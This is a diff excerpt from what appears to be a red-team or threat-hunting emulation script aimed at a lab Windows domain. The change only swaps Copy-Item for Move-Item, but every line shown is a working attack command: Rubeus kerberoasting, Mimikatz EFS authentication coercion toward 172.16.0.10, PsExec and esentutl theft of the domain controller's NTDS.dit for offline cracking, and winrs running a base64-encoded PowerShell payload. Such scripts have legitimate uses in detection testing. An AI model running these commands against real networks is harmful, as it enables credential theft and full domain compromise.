@@ -78,7 +78,7 @@ C:\tools\Rubeus.exe kerberoast /dc:RCCE-SVR19-1 /creduser:cloudhunters.local\jjb
 C:\tools\mkz\x64\mimikatz.exe "privilege::debug" "misc::efs /server:RCCE-SVR19-1 /connect:172.16.0.10 /noauth" "exit"
 
 # Data Exfiltration of NTDS.DIT file for offline cracking
-C:\tools\pstools\PsExec.exe \\RCCE-SVR19-1 -accepteula -sid c:\windows\system32\Esentutl.exe /y /i c:\Windows\NTDS\ntds.dit /d c:\tools\ntds.dit /vssrec ; Copy-Item -Path "\\RCCE-SVR19-1\tools\ntds.dit" -Destination "C:\tools"
+C:\tools\pstools\PsExec.exe \\RCCE-SVR19-1 -accepteula -sid c:\windows\system32\Esentutl.exe /y /i c:\Windows\NTDS\ntds.dit /d c:\tools\ntds.dit /vssrec ; Move-Item -Path "\\RCCE-SVR19-1\tools\ntds.dit" -Destination "C:\tools"
 
 # Remote Code Execution attempts
 winrs /r:RCCE-SVR19-1 "powershell -NonInteractive -OutputFormat xml -NoProfile -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFMAaABhAHIAZQAgAC0AUAByAG8AcABlAHIAdAB5ACAATgBhAG0AZQAsAFMAdABhAHQAdQBzACwAUABhAHQAaAAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIABSAE8ATwBUAFwAYwBpAG0AdgAyACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBDAFMAVgAgAC0ATgBvAFQAeQBwAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAA=="
